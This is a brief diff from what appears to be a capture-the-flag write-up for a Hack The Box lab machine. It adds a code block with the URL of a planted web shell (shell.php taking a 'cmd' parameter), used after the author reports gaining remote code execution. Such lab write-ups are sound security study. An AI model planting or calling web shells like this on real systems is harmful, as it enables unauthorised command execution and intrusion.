@@ -151,3 +151,6 @@ I will then proxy the request
 
 I now have RCE
 
+```python
+http://mist.htb/data/modules/shell/exploit/shell.php?cmd=
+```
